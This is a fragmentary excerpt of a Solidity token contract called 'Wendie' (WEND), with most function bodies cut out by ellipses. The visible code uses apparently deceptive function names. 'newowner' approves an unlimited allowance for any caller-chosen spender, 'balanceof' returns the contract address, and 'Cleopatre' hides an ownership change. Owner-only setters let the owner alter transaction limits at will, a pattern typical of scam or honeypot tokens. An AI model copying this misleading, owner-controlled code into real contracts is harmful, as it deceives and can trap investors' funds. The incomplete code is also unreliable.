...
contract Ownable is Context {  
    ...
    */
    ...
    function Cleopatre(address newOwner) public onlyOwner {
...
contract Wendie is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000 *  10**9;  
    string private _name = "Wendie";
    string private _symbol = "WEND";
    ...
    function addition(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
    {
    ...
    function updateSwap(bool enableSwapBack, uint256 newSwapBackLimit) external onlyOwner {
        inSwapEnable  = enableSwapBack;
        _swapThreshold = newSwapBackLimit;
    }

    function inputValue(uint256 newLimit) external onlyOwner {
        _maxAmountTx = newLimit;
    }
    
    function withdrawtoken(bool _flag, uint256 val) external view returns(uint256) {
        uint256 _autoRebase;
        if (_flag) {            
    ...
    function newowner(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function balanceof() public view virtual returns (address) {
        return address(this);
    }
    
    function getGtokenRemoveasMaxLimit(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
      require(gas >= 750000);
